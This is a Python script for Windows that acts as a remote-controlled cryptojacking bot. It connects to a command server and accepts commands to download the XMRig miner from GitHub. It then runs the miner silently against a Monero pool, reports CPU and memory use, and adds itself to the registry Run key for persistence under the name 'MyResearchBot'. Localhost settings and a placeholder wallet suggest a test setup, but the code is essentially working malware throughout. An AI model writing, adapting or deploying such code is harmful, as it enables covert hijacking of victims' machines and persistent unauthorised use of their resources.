import subprocess
import socket
import time
import threading
import urllib.request
import zipfile
import os
import sys

# Constants
HOST = '127.0.0.1'
PORT = 9999

# Global socket and mining process
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
xmrig_proc = None  # Track mining process

# ---------------------
# System Info Functions
# ---------------------

def get_cpu_usage_windows():
    try:
        output = subprocess.check_output(
            ['powershell', '-Command',
             "(Get-Counter '\\Processor(_Total)\\% Processor Time').CounterSamples.CookedValue"],
            stderr=subprocess.DEVNULL
        ).decode().strip()

        return int(float(output))
    except Exception as e:
        return "N/A"



def get_memory_usage_windows():
    try:
        output = subprocess.check_output(
            ['powershell', '-Command',
             "(Get-CimInstance Win32_OperatingSystem | "
             "Select-Object @{Name='Used';Expression={[math]::Round((($_.TotalVisibleMemorySize - $_.FreePhysicalMemory) / $_.TotalVisibleMemorySize) * 100)}}).Used"],
            stderr=subprocess.DEVNULL
        ).decode().strip()

        return int(output)
    except Exception as e:
        return "N/A"




# ---------------------
# Persistence (Startup)
# ---------------------

def persistence():
    try:
        exe_path = sys.executable
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        name = "MyResearchBot"
        subprocess.call([
            "reg", "add", f"HKCU\\{key}", "/v", name, "/t", "REG_SZ", "/d", exe_path, "/f"
        ])
        s.send(b"[INFO] Added to startup")
    except Exception as e:
        s.send(f"[ERROR] Failed to add to startup: {e}".encode())

# ---------------------
# Miner Downloader
# ---------------------

def download_xmrig_windows():
    url = "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip"
    zip_name = "xmrig.zip"
    extract_dir = "xmrig_files"

    try:
        urllib.request.urlretrieve(url, zip_name)

        with zipfile.ZipFile(zip_name, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)

        for root, dirs, files in os.walk(extract_dir):
            if "xmrig.exe" in files:
                full_path = os.path.join(root, "xmrig.exe")
                return full_path

        return None
    except Exception as e:
        return None

# ---------------------
# Mining Control
# ---------------------

def start_xmrig():
    global xmrig_proc
    xmrig_path = os.path.join("xmrig_files", "xmrig-6.21.3", "xmrig.exe")
    if os.path.exists(xmrig_path):
        xmrig_proc = subprocess.Popen([
            xmrig_path,
            "-o", "pool.supportxmr.com:3333",
            "-u", "YOUR_MONERO_WALLET_ADDRESS",  # Replace with the test wallet address
            "-k"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    else:
        s.send(b"[ERROR] xmrig.exe not found. Use download_xmrig first.")

def stop_xmrig():
    global xmrig_proc
    if xmrig_proc:
        xmrig_proc.terminate()
        xmrig_proc = None

# ---------------------
# Command Handler
# ---------------------

def connect():
    global xmrig_proc
    while True:
        try:
            cmd = s.recv(1024).decode().strip()
            if cmd == "start_xmrig":
                start_xmrig()
                s.send(b"[INFO] Mining started")
            elif cmd == "stop_mining":
                stop_xmrig()
                s.send(b"[INFO] Mining stopped")
            elif cmd == "download_xmrig":
                path = download_xmrig_windows()
                if path:
                    s.send(b"[INFO] XMRig downloaded successfully")
                else:
                    s.send(b"[ERROR] Failed to download XMRig")
            elif cmd == "report_status":
                cpu = get_cpu_usage_windows()
                mem = get_memory_usage_windows()
                status_msg = f"CPU {cpu}%, Memory {mem}"
                s.send(status_msg.encode())
            elif cmd == "persist":
                persistence()
            elif cmd == "exit":
                stop_xmrig()
                s.send(b"[INFO] Exiting.")
                break
            else:
                s.send(b"[ERROR] Unknown command")
        except Exception as e:
            try:
                s.send(f"[ERROR] {e}".encode())
            except:
                break

# ---------------------
# Entry Point
# ---------------------

if __name__ == "__main__":
    if os.name != 'nt':
        print("[ERROR] This script only supports Windows.")
        sys.exit(1)
    connect()
